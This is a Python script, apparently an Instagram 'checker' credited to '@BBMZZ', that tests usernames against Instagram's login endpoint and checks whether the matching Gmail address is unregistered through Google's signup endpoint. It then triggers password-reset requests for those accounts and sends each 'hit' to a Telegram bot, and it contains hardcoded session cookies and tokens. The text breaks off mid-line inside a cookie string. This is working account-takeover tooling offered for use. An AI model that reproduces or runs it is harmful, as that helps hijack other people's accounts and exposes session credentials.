import os

try:
    import requests
    import user_agent
except ImportError as error:
    os.system('pip install requests')
    os.system('pip install user-agent')
    os.system('clear')
    pass
import time
import requests
import random
import datetime
import secrets
from user_agent import generate_user_agent
try:
    os.remove('IG-Checker-3.py')
    os.remove('IG-Checker-1.py')
    os.remove('IG-Checker-2.py')
    os.remove('IG-Checker.py')
    print('Done remove ...')
except FileNotFoundError as error:
    pass


time.sleep(0.9)
class Checker:
    def __init__(self):
        #os.system('clear')
        self.pr ="\033[1;33mT : The Email in saved in file name \033[1;32mHackedBBMZZ.txt\n\033[1;33mE : سيتم حفظ الصيد في ملف \033[1;32mHackedBBMZZ.txt\n\033[1;31mU : Updated Tool 0.1"
        print(self.pr,'\n')
        self.day = datetime.date.today()
        self.true = 0
        self.bloak = 0
        self.random = 0
        self.cok = secrets.token_hex(8) * 2
        self.number = 0
        self.bad = 0
        self.ok = 0
        self.j = 0
        self.error = 0
        self.fillnm = "\033[1;32m[=] - Enter Your File Name : "
        self.file = "\033[1;32m[1] = File Checker"
        self.fil1 = "\033[1;32m[2] = Reomve File Name "
        self.telegram = '\033[1;32m[-] = Telegrma @BBMZZ\n'+'\033[1;31m-'*50
        self.ent ='\033[1;32m[-] = Enter Your : '
        self.errorr = "\033[1;31m[-] - Error Choice The Number  - اختيار الرقم خطأ"
        self.namef= '\033[1;32m[=] - Enter Your File Name in Remove'
        self.errorf= "\033[1;33m[!] - The File Error - الملف غير موجود"
        self.oky = "\033[1;32mHit Accouint"
        self.bada = "\033[1;31mBad Accouint "
        self.badgm = "\033[1;31mBad Gmail"
        self.badgmail = 0
        self.ran()
    def filename(self):
        self.nm = input(self.fillnm)
        
        self.ck()
    def inp(self):
        self.ip = str(input(self.us))
        self.ch()
    def ok1(self):
        self.us = (f'{self.file}\n{self.fil1}\n{self.telegram}\n\n{self.ent}')
        pass
        self.inp()
    def removefile(self):
        self.iw = input(self.namef)
        os.remove(self.iw)
    def resp(self):
        try:
            try:
                
                self.rf = requests.post(self.url,headers=self.head1,data=self.data).text
                print(self.rf)
            except requests.exceptions.ReadTimeout as error:
                pass
            
        except requests.exceptions.ConnectionError as error:
            pass
    def tok(self):
        os.system('clear')
        self.token = str(input('[-] = Enter Your Token Bot : '))
        try:

            self.idm = int(input('[-] = Enter Your ID Telegram : '))
        except ValueError as error:
            self.tok()
        self.che()
    def ran(self):
        url1 ='https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=81859&rt=j'
        headers ={
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Length': '2064',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'Cookie': self.cok,#'OTZ=7108643_44_44__44_; SID=ZAgOc9OvS8qmPbRWVnvwEyfZAz6PRDgOnlis15506yWZEhjmr15yp_oaL_xeeEfBVgjaBw.; __Secure-1PSID=ZAgOc9OvS8qmPbRWVnvwEyfZAz6PRDgOnlis15506yWZEhjmCBuWPmTPTNYW2baZrFNzSg.; __Secure-3PSID=ZAgOc9OvS8qmPbRWVnvwEyfZAz6PRDgOnlis15506yWZEhjmIpBbJ-F4oxIaIpyA8uiYoA.; HSID=AC7zuP_2Cfr6WV4Wo; SSID=Ad8QrA6AwPbt0I4Ct; APISID=AcEUObc0anVhu-iW/AfERzaprKwiLXOZdQ; SAPISID=pv9phW9AGBMgfTmV/AvEys3dopGqeIznpY; __Secure-1PAPISID=pv9phW9AGBMgfTmV/AvEys3dopGqeIznpY; __Secure-3PAPISID=pv9phW9AGBMgfTmV/AvEys3dopGqeIznpY; ACCOUNT_CHOOSER=AFx_qI50RgWS2YPtrRsLg5jdWUSb4etOkTUEDsCovfewzH7R2eHUxsbxIQlKQ3WhhWXY4b6FvxZRxr8f9jBG3F-jqyF63uOAW-aRViL0ebgO0SVvTY2qy2A; LSID=s.IQ|s.youtube:ZAgOc-DgBLCTDdYVmczO73XnVdz9zaPwLDIGwt7FIENduEslG00ghU8D3fbQuCtqoctP1Q.; __Host-1PLSID=s.IQ|s.youtube:ZAgOc-DgBLCTDdYVmczO73XnVdz9zaPwLDIGwt7FIENduEslCCZcErElgJT2GDIldS5yLA.; __Host-3PLSID=s.IQ|s.youtube:ZAgOc-DgBLCTDdYVmczO73XnVdz9zaPwLDIGwt7FIENduEsl-v0Slnxtri4P9Pfc4GyQdw.; SEARCH_SAMESITE=CgQI55gB; AEC=Ad49MVHZHQnKsQr1I69z0bbuXdrGfmBK65sFxqCVzpjtiInm7RCL0-x0fao; 1P_JAR=2023-07-22-09; NID=511=TzSyzIQPm-iT9JvsSke0UtNiC-D4T9Pxwaju7i18lmOW5TQYCGPdgsK1bNzeSX4sgQQqPSxhNEO70WLgSS-e8yExlc6apcS7llKLVJfi2ojviDNZkS56nZ7A5tBEeLUZyyk67wCuqnvGNnxfcrEzkhbnZyFr7LjaptoAun37vzTRxc7sDIRXQgYelYKHeDA4sydYNavUj8-2aIeluThJFZzVOtNUvm_pmB8Hl186NrVh-Ic-ZvgIcycFoXlWSzWWM0axLdiEkvoaueDhjw; __Secure-1PSIDTS=sidts-CjEBPu3jIYr-PGBP-nzKbXTJetKPgsUr4wHSMBKn3VT0Q0f8RiGe-IPjQJ5UmAYADiFvEAA; __Secure-3PSIDTS=sidts-CjEBPu3jIYr-PGBP-nzKbXTJetKPgsUr4wHSMBKn3VT0Q0f8RiGe-IPjQJ5UmAYADiFvEAA; __Host-GAPS=1:8pTs3fQUZi0PSARTUgKu0XQD7uTV2V70VDF8CCsojS0dlIRhSoNmFfZQNTyUyS4dLDyN6ooBCMpAbKh3LY3_MCD7VaxOjw:8YgpjTOK8955x5s0; SIDCC=APoG2W-kcNEPTAYb39TL2fO8qnBvjAXylVVDzCnQZWO5CyeGbPeHT_s59jfWE1WR-lOae4sBYqI; __Secure-1PSIDCC=APoG2W8N4c7gP3G-DWVqhS2gfO_IbSUR5YZeCPzxnYL4bGlX6HWq4YgQuAeUQaJ29-ausVXYQg; __Secure-3PSIDCC=APoG2W-1HlpLmTDjKURgPV16ED3Ryb4kQbTo-MSWiOf2Kewy1tmjtoTVtZjnKPr8RYT6ldCV2AU',
            'Google-Accounts-Xsrf': '1',
            'Origin': 'https://accounts.google.com',
            'Referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fe-11-8976fbef68f7663ea60e661c4f9b5-1475984d740df90158840a19af1784235fe51b7e&flowName=GlifWebSignIn&flowEntry=SignUp',
            'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'Sec-Ch-Ua-Arch': '"x86"',
            'Sec-Ch-Ua-Bitness': '"64"',
            'Sec-Ch-Ua-Full-Version': '"114.0.5735.199"',
            'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.199", "Google Chrome";v="114.0.5735.199"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Model': '""',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
            'Sec-Ch-Ua-Wow64': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'X-Chrome-Id-Consistency-Request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=fbc22924-4987-44e1-b323-7d3efd00dded,signin_mode=all_accounts,signout_mode=show_confirmation',
            'X-Client-Data': 'CIm2yQEIprbJAQipncoBCIXwygEIlKHLAQiFoM0BCJyrzQEI2rTNAQjcvc0BCLy+zQEI1L7NAQjgxM0BCO/EzQEIqMXNAQ==',
            
            'X-Same-Domain': '1'


            }
        data1 ={
            'continue': 'https://accounts.google.com/ManageAccount?nc=1',
            'f.req': '["AEThLlzCTLyoshyixCRoA6ccDmpMOZ-PomPBC9ByGLX3o8xDU8VIGoGBy9vj5D-3txgufFW3ZtNzDWAvNXmveIo95oRGruoTaALFrDIhPuzD6SscTf--ya7mjnd2vNDxwPxgQ8x0xH0lZbKjF_sEWyzM-yiKQQMUpjq4lV_UmC87yQkt9qmndf-Jw-HrXgdPSNZYSfnvTk-u",null,null,null,null,0,0,"zaid","zaid","web-glif-signup",0,null,10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"fbc22924-4987-44e1-b323-7d3efd00dded",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],1]',
            'at': 'AFoagUUm6HX36QVWDo2X-TVlmW9vQ8p6Iw:1689946784467',
            'azt': 'AFoagUWbi-h35AWa309jmxoLN8DKwbn2KA:1689946784467',
            'cookiesDisabled': 'false',
            'deviceinfo':' [null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"fbc22924-4987-44e1-b323-7d3efd00dded",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,1]',
            'gmscoreversion': 'undefined',
            'flowName': 'GlifWebSignIn',
            'checkConnection': 'youtube:584:0',
            'checkedDomains': 'youtube',
            'pstMsg': '1'

        }
       
     
            
        rt=requests.post(url1,headers=headers,data=data1).text
      
        
    
        tp = rt.split('"gf.ttu",null,"')[1].split('"]')[0]
        
        with open('token.txt','w') as f0:
            f0.write(f'{tp}\n')
        self.ok1()
    def ch(self):
        if self.ip=='1' or self.ip =='1':
            os.system('clear')
            self.filename()
        if self.ip=='2' or self.ip =='2':
            self.removefile()
    def ck(self):
        try:
            self.op = open(self.nm,'r').read().splitlines()
            self.tok()
        except FileNotFoundError as error:
            os.system('clear')
            print(f'{self.errorf}')
    
    def che(self):
        for self.fi in self.op:
            self.em1 = self.fi
            if ('@') in self.em1:
                self.em = self.em1.split('@')[0]
            else:
                self.em = self.em1.split('@')[0]

            self.url ='https://www.instagram.com/api/v1/web/accounts/login/ajax/'

            self.head1 = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-length': '291',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=iMd8tAhvwezltsWZAVi1adkaSyB7EUzO; ds_user_id=58173081681; shbid="12243\05458173081681\0541711782047:01f709696fd88f95ae617bb02b5b6d15a9e8996d88f9e2d3ee8855533aedb9f4987abd92"; shbts="1680246047\05458173081681\0541711782047:01f7d73e9f512a0f35a524df1d0f51b48fcb0023309d321cfb9c3f54c755152397f7da58"; fbsr_124024574287414=LLfGuxN7PwilAJQ2w2bGqQmOX6p3T2JreIplqK1mKOo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRRFRUem5mcW1BRUJDbGZHcjJSWWV5UERTd3RhSEJTM2lsTERTaUdXZF9fTHdCaFp2VV9ndVltWEJINE9DenUxamJCbWh3TWtSVmdUOXRyWDVWTHlpcGFFY01fMFlSb3pHOVRibWE0NkRMMm9GTE9FWmJhdzhSNF84c2hDZl9FZGtwb2V4MmtSYTIzNm8xa3A2LWFzZGNRVVk4eVFSU3NwQzlhaEI4NFBYWk1FMVA4aUt5aEIzWGlXOGxjaGJ0Y1R2WEdsUnRBNl91MnlCNExxN09PRjdXZG1DT2p6c2lBM3BsZEY4X2FjX181OGpTUDBTSC1DS0dQMHZYYldlaVBDSWs2ell4SGtkRmNTVkdIUE5sTDB3aUk4azBNcVdSbl9nbXk5RWptV282dmRBQlpVTTVabmJwYXFOT2dLem9ndzRDU2x4WUI3clQtUzdjaWJUbGNqWTlZIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUVsVmlXS2JhMkJlRTEwSlBoS01iNVVsdFlhYUlKY05zZVdZWkFodFpCWkNUcElmOTZrNk9nTE9mTnZ1RjdMcUs5WkMyUk1NUWxCQXJPNzVuWkE3U3JLcEtLR3JsRDFEMU5QOWZ5MkxNZkQzeHNINGpMeG9tQUtoRGRnUW1Ea2dzNk10TFNVSEVQbVJFWkFXZkJ5Y1pDbGZmTmp5eGR5U1Jtb3JyN1N2SXN4Y3g2OTdxSVZSSXNaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgwNTQwMzI3fQ',
                    'sec-ch-prefers-color-scheme': 'light',
                    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
            
                    'user-agent': '{}'.format(generate_user_agent()),
                    'x-csrftoken': 'iMd8tAhvwezltsWZAVi1adkaSyB7EUzO',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': '1007230059',
                    'x-requested-with': 'XMLHttpRequest'
            }
            self.tim = str(time.time()).split('.')[0]
            self.data = {
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{self.tim}:zaidgzikbbmzz',
                'username': f'{self.em}@gmail.com',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'
            }
            try:
                try:
                    
                    self.rf = requests.post(self.url,headers=self.head1,data=self.data).text
                    if ('"Sorry, your password was incorrect. Please double-check your password."') in self.rf:
                        self.bad+=1
                        os.system('cls'if os.name=='nt'else'clear')
                        print(f'{self.oky}: {self.ok} - {self.bada} : {self.bad} - {self.badgm} : {self.bloak}')
                    elif ('"Sorry, there was a problem with your request.') in self.rf:
                        time.sleep(26)
                    elif ('"user":true,') in self.rf:
                        self.fi = open('token.txt','r').read().splitlines()
                        self.tl = random.choice(self.fi)
                        
                       
                        self.gmail1 = self.em
                        number = '1234567890'
                       
                        
                        
                            #num = str(''.join(random.choice(number) for i in range(7)))
                        url = f'https://accounts.google.com/_/signup/usernameavailability?hl=ar&TL={self.tl}&_reqid=481859&rt=j'
                        headers = {
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Content-Length': '1146',
                            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                            #'Cookie': 'OTZ=7108643_44_44__44_; 1P_JAR=2023-07-20-14; AEC=Ad49MVGLdm0yAKYn0PndzTaQZB5QDYm_tDCKH_vF7CBNWRHo9k-MLgX6Qpg; NID=511=eT6Dsn5OeQnzWAsknlkrcehUjeWJExuQWLkRMewKpYeYl8vXZfgYED18YKlywX6u--ceLMVOrRfJ69SuyDP3o42HRRA6Xqlcetwi2-XribhN2gI83vbhqXf_3Wwe8jB_XYR7Bt8qrw4nez5AeZ_rcdSLWVAqT1i-RC3yUoeJumU6MzZqAlDF2efOAFLXovoqF2RHW6sZwqZt-8s; __Host-GAPS=1:8Wx3cVdfKlC-Is1UIC_sktz1J0GrkA:upvwVYNk8jYTFOXH',
                            'Google-Accounts-Xsrf': '1',
                            'Origin': 'https://accounts.google.com',
                            'Referer':
                            'https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=SignUp&TL=AJvNCbbAigRHG5Ypddwgp39mKdyniOE3D3uLi3iK805IzUq1NNSbRnz7QQ6b_tTu',
                            'User-Agent': generate_user_agent(),
                            #'X-Chrome-Id-Consistency-Request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=0e886cd5-0c72-4d02-adb8-aa64ae664a4a,signin_mode=all_accounts,signout_mode=show_confirmation',
                            #'X-Client-Data': 'CIm2yQEIprbJAQipncoBCIXwygEIlqHLAQiFoM0BCJyrzQEI2rTNAQjcvc0BCLy+zQEI1L7NAQj/v80BCLLDzQEI7sTNAQioxc0B'
                        }
                        data = {
                            'datcontinue': 'https://uc.appengine.google.com/_ah/conflogin?state=~AJKiYcGoPiLJb7FyAN6mbCNCjMH037vL_6C39BUsJA2GF6P5lw1fJ6zYEHHUw663dDmmWQqnSQj6F1H89kr0oAzGCTf1OVJVmr9O71L1w89w388Qo8F51B0AsXfY4lW59yc42hfwocycpD-KrQxXpL_wNY1CXqq7EwVgxTdIeLOVnU-5xSbZ8812E9pDOYWDOi2xFjrP52ODHXY16KTZWlHmcwb4WPbjByt1nT71cz8msPMP1rVSoXY',
                            'dsh': 'S2080850673:1689863726476816',
                            'flowEntry': 'ServiceLogin',
                            'ifkv': 'AeDOFXgxTTjgoRCMuYvMYScwDmQo7816fmgZo5HW-2qv1sxmBtxR8_QpcokS3oMTn4QP3Fp_J3h15Q',
                            'f.req': '["TL:{}","{}",0,0,1]'.format(self.tl, self.gmail1),
                            'azt': 'AFoagUWjPq1xG8LVoJkd3pOHgMJrOj0MAA:1689863743434',
                            'cookiesDisabled': 'false',
                            'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"fbc22924-4987-44e1-b323-7d3efd00dded",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,1]',
                            'gmscoreversion': 'undefined',
                            'flowName': 'GlifWebSignIn',
                            'checkConnection': 'youtube:452:0',
                            'checkedDomains': 'youtube',
                            'pstMsg': '1',
                        }

                        req = requests.post(url, headers=headers,data=data).text
                        print(req)
                      
                        if ('"gf.uar",1') in req:
                            
                            nn = self.em
                            url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(nn)
                            head2={
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9',
                                'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                                'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                                'sec-ch-prefers-color-scheme': 'light',
                                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                                'x-ig-app-id': '936619743392459',
                                'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                                'x-instagram-ajax': '1006627630',
                                'x-requested-with': 'XMLHttpRequest'
                            }
                            try:
                                try:
                                    
                                    ge = requests.get(url2,headers=head2).json()
                                except requests.exceptions.ReadTimeout as error:
                                    continue
                            except requests.exceptions.ConnectionError as error:
                                continue
                            try:

                                id = ge['data']['user']['id']
                                fol = ge['data']['user']['edge_followed_by']['count']
                                bio = ge['data']['user']['biography']
                                fols = ge['data']['user']['edge_follow']['count']
                                img = ge['data']['user']['profile_pic_url']
                                nam = ge['data']['user']['full_name']
                                os.system('cls'if os.name=='nt'else'clear')
                       
                                rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                                with open('HackedBBMZZ.txt','a') as f8:
                                    f8.write(f'{self.em}\n')
                                ree = rl.json()
                                da = ree['date']
                                headers1 = {
                # 'Content-Length': '305',
                                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                    'viewport-width': '917',
                                    'x-asbd-id': '198387',
                                    'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                                }
                                data3 = {
                                    'ig_sig_key_version': '4',
                                    "user_id":id
                                }
                                urlr='https://www.instagram.com/accounts/account_recovery_ajax/'
                                headr= {
                                    'accept': '*/*',
                                    'accept-encoding': 'gzip, deflate, br',
                                    'accept-language': 'en-US,en;q=0.9',
                                    'content-length': '336',
                                    'content-type': 'application/x-www-form-urlencoded',
                                    'cookie': 'mid=YuPxZAABAAEUVYcD2B0cFEzLEyuU; ig_did=50092572-86B8-4779-8D7D-ED783D6BE001; dpr=3; datr=lPHjYm79ZCBQZ-8kyLncySC7; shbid="572\05454072972258\0541691059333:01f70b5caa78629654a33ffe9055bdc7663b824064ba3854ecfade7109c72ee455eb5eb8"; shbts="1659523333\05454072972258\0541691059333:01f7ce1fd97040b48210c72b760bfbbf68254544b85860f356f3dc04622ee5bfd6edb2d9"; rur="RVA\05454072972258\0541691069797:01f7513337be7c4309672fc0a95436c4f0b60d9f1ff74355b61efadb1b1079fb38505eea"; csrftoken=tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
                                    'origin': 'https://www.instagram.com',
                                    'referer': 'https://www.instagram.com/',
                                    'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
                                    'sec-ch-ua-mobile': '?0',
                                    'sec-fetch-dest': 'empty',
                                    'sec-fetch-mode': 'cors',
                                    'sec-fetch-site': 'same-origin',
                                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
                                    'viewport-width': '30',
                                    'x-asbd-id': '437806',
                                    'x-csrftoken': 'tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
                                    'x-ig-app-id': '936619743392459',
                                    'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
                                    'x-instagram-ajax': 'caee87137ae9',
                                    'x-requested-with': 'XMLHttpRequest'
                                }
                                datar={
                                    'query': f'{nn}'
                                }
                                rq = requests.post(urlr,headers=headr,data=datar).json()
                              
                                try:
                                    B19 =f"{nn}"
                                    fa =str(rq['options']['can_use_facebook'])
                                    if fa =='True':
                                        L3 = 'True'
                                    else:
                                        L3='False'
                                    ph = str(rq['options']['can_send_phone'])
                                    if ph =='True':
                                        L5 = 'True'
                                    else:
                                        L5='False'
                                except KeyError as Error:
                                    L7 ='الريست لا يعمل'
                                try:
                                    try:
                                        
                                        res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                                    except requests.exceptions.ReadTimeout as errro1:
                                        continue
                                    try:
                                        rs =str(res['obfuscated_email'])
                                    except KeyError as error:
                                        continue
                                except requests.exceptions.ConnectionError as error:
                                    continue
                                self.j+=1
                                ido =self.idm

                                try:
                                    try:
                                        
                
                                        try:
                                            lm = f'𝙷𝙸𝚃𖥢 : {self.j}\n𝙽𝙰𝙼𝙴🜑 : {nam}\n𝙺𝚂𝙴𝙽𝙰𝙼𝙴🜾 : {nn}\n𝙴𝙼𝙰𝙸𝙻⛧ : {nn}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶❛ : {fol}\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂🜝 : {fols}\n𝙿𝙾𝚂𝚃𖤴 :\n𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺𖤥 : {L3}\n𝙿𝙷𝙾𝙽𝙴🜜 : {L5}\n𝙸𝙳🜝 : {id}\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃𖥆 : {da}\n𝚁𝙴𝚂𝚃 𖠬 : {rs}\n𝚃𝙸𝙼𝙴 𝙽𝙴𝚆𖤺 : {self.day}\n𝙿𝚈ꫝ : @BBMZZ'
                                            tlg =(f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={ido}&text={lm}')
                                            ru= requests.post(tlg)
                                            
                                        except UnboundLocalError as error:
                                            lm1 = f'𝙷𝙸𝚃𖥢 : {self.j}\n𝙽𝙰𝙼𝙴🜑 : {nam}\n𝙺𝚂𝙴𝙽𝙰𝙼𝙴🜾 : {nn}\n𝙴𝙼𝙰𝙸𝙻⛧ : {nn}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶❛ : {fol}\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂🜝 : {fols}\n𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺𖤥 : {L3}\n𝙿𝙷𝙾𝙽𝙴🜜 : {L5}\n𝙸𝙳🜝 : {id}\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃𖥆 : {da}\n𝚁𝙴𝚂𝚃 𖠬 : Error\n𝚃𝙸𝙼𝙴 𝙽𝙴𝚆𖤺 : {self.day}\n𝙿𝚈ꫝ : @BBMZZ'
                                            tlg =(f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={ido}&text={lm1}')
                                            ru= requests.post(tlg)
                                    except requests.exceptions.ReadTimeout as erp:
                                        continue
                                except requests.exceptions.ConnectionError as error:
                                    continue
                                #post = ge['data']['user']['efge_owner_to_timeline_media']['count']
                            except KeyError as error :
                                lm = f'Email : {self.em}\n\n@BBMZZ'
                                tlg =(f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={ido}&text={lm}')
                                ru= requests.post(tlg)
                            self.ok+=1
                            os.system('cls'if os.name=='nt'else'clear')
                            print(f'{self.oky}: {self.ok} - {self.bada} : {self.bad} - {self.badgm} : {self.bloak}')
                            
                            
                        
                        elif ('78') in req:
                            
                                    url1 ='https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=81859&rt=j'
                                    headers ={
                                        'Accept': '*/*',
                                        'Accept-Encoding': 'gzip, deflate, br',
                                        'Accept-Language': 'en-US,en;q=0.9',
                                        'Content-Length': '2064',
                                        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                                        'Cookie': self.cok,#'OTZ=7108643_44_44__44_; SID=ZAgOc9OvS8qmPbRWVnvwEyfZAz6PRDgOnlis15506yWZEhjmr15yp_oaL_xeeEfBVgjaBw.; __Secure-1PSID=ZAgOc9OvS8qmPbRWVnvwEyfZAz6PRDgOnlis15506yWZEhjmCBuWPmTPTNYW2baZrFNzSg.; __Secure-3PSID=ZAgOc9OvS8qmPbRWVnvwEyfZAz6PRDgOnlis15506yWZEhjmIpBbJ-F4oxIaIpyA8uiYoA.; HSID=AC7zuP_2Cfr6WV4Wo; SSID=Ad8QrA6AwPbt0I4Ct; APISID=AcEUObc0anVhu-iW/AfERzaprKwiLXOZdQ; SAPISID=pv9phW9AGBMgfTmV/AvEys3dopGqeIznpY; __Secure-1PAPISID=pv9phW9AGBMgfTmV/AvEys3dopGqeIznpY; __Secure-3PAPISID=pv9phW9AGBMgfTmV/AvEys3dopGqeIznpY; ACCOUNT_CHOOSER=AFx_qI50RgWS2YPtrRsLg5jdWUSb4etOkTUEDsCovfewzH7R2eHUxsbxIQlKQ3WhhWXY4b6FvxZRxr8f9jBG3F-jqyF63uOAW-aRViL0ebgO0SVvTY2qy2A; LSID=s.IQ|s.youtube:ZAgOc-DgBLCTDdYVmczO73XnVdz9zaPwLDIGwt7FIENduEslG00ghU8D3fbQuCtqoctP1Q.; __Host-1PLSID=s.IQ|s.youtube:ZAgOc-DgBLCTDdYVmczO73XnVdz9zaPwLDIGwt7FIENduEslCCZcErElgJT2GDIldS5yLA.; __Host-3PLSID=s.IQ|s.youtube:ZAgOc-DgBLCTDdYVmczO73XnVdz9zaPwLDIGwt7FIENduEsl-v0Slnxtri4P9Pfc4GyQdw.; SEARCH_SAMESITE=CgQI55gB; AEC=Ad49MVHZHQnKsQr1I69z0bbuXdrGfmBK65sFxqCVzpjtiInm7RCL0-x0fao; 1P_JAR=2023-07-22-09; NID=511=TzSyzIQPm-iT9JvsSke0UtNiC-D4T9Pxwaju7i18lmOW5TQYCGPdgsK1bNzeSX4sgQQqPSxhNEO70WLgSS-e8yExlc6apcS7llKLVJfi2ojviDNZkS56nZ7A5tBEeLUZyyk67wCuqnvGNnxfcrEzkhbnZyFr7LjaptoAun37vzTRxc7sDIRXQgYelYKHeDA4sydYNavUj8-2aIeluThJFZzVOtNUvm_pmB8Hl186NrVh-Ic-ZvgIcycFoXlWSzWWM0axLdiEkvoaueDhjw; __Secure-1PSIDTS=sidts-CjEBPu3jIYr-PGBP-nzKbXTJetKPgsUr4wHSMBKn3VT0Q0f8RiGe-IPjQJ5UmAYADiFvEAA; __Secure-3PSIDTS=sidts-CjEBPu3jIYr-PGBP-nzKbXTJetKPgsUr4wHSMBKn3VT0Q0f8RiGe-IPjQJ5UmAYADiFvEAA; 